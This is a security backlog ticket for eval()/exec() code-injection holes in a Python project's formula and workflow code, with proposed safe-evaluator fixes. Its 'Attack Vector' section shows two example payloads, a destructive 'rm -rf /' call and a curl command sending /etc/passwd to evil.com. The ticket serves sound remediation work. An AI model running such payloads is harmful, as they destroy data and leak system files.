# SEC-002: Eval/Exec Code Injection Vulnerability

## Priority: CRITICAL
## Category: Security
## Status: Backlog

## Summary

Critical security vulnerability: use of `eval()` and `exec()` for code execution allows arbitrary code injection attacks.

## Affected Files

| File | Line | Function | Risk |
|------|------|----------|------|
| `src/core/alpha_factors.py` | 175 | Formula evaluation | `eval()` on user-provided formulas |
| `src/core/visual_workflow.py` | 488 | Code execution | `exec()` on workflow code |
| `src/core/visual_workflow.py` | 502 | Expression evaluation | `eval()` on expressions |

## Current Vulnerable Code

```python
# src/core/alpha_factors.py:175
def evaluate_formula(self, formula: str, context: dict) -> float:
    return eval(formula, {"__builtins__": {}}, context)  # VULNERABLE!

# src/core/visual_workflow.py:488
def execute_code(self, code: str) -> Any:
    exec(code, globals())  # EXTREMELY VULNERABLE!
```

## Attack Vector

An attacker could inject malicious code:
```python
# Malicious formula input
formula = "__import__('os').system('rm -rf /')"

# Or via workflow code
code = "import subprocess; subprocess.run(['curl', 'http://evil.com/steal', '-d', open('/etc/passwd').read()])"
```

## Proposed Fix

### Option 1: Use ast.literal_eval (Limited)
```python
import ast

def safe_eval_literal(expression: str) -> Any:
    """Only evaluates literals - no function calls."""
    return ast.literal_eval(expression)
```

### Option 2: Use simpleeval Library (Recommended)
```python
from simpleeval import simple_eval, EvalWithCompoundTypes

def safe_eval_formula(formula: str, context: dict) -> float:
    """Safe expression evaluation with limited operations."""
    evaluator = EvalWithCompoundTypes(
        names=context,
        functions={
            "abs": abs,
            "min": min,
            "max": max,
            "sum": sum,
            "round": round,
        }
    )
    return evaluator.eval(formula)
```

### Option 3: Custom Expression Parser
```python
import ast
import operator

SAFE_OPERATORS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
}

def safe_eval_expression(expr: str, variables: dict) -> float:
    """Parse and evaluate simple math expressions safely."""
    tree = ast.parse(expr, mode='eval')
    return _eval_node(tree.body, variables)

def _eval_node(node, variables):
    if isinstance(node, ast.Num):
        return node.n
    elif isinstance(node, ast.Name):
        if node.id not in variables:
            raise ValueError(f"Unknown variable: {node.id}")
        return variables[node.id]
    elif isinstance(node, ast.BinOp):
        op = SAFE_OPERATORS.get(type(node.op))
        if op is None:
            raise ValueError(f"Unsupported operator: {type(node.op)}")
        return op(_eval_node(node.left, variables), _eval_node(node.right, variables))
    raise ValueError(f"Unsupported expression: {type(node)}")
```

## Implementation Tasks

- [ ] Remove all `eval()` calls from production code
- [ ] Remove all `exec()` calls from production code
- [ ] Install and configure `simpleeval` library
- [ ] Create safe expression evaluator wrapper
- [ ] Add input validation before evaluation
- [ ] Add security tests for injection attempts
- [ ] Document allowed expression syntax

## Success Criteria

- Zero uses of `eval()` or `exec()` on user input
- All formula evaluation uses safe parser
- Security tests pass for injection attempts
- Code review confirms no bypasses possible
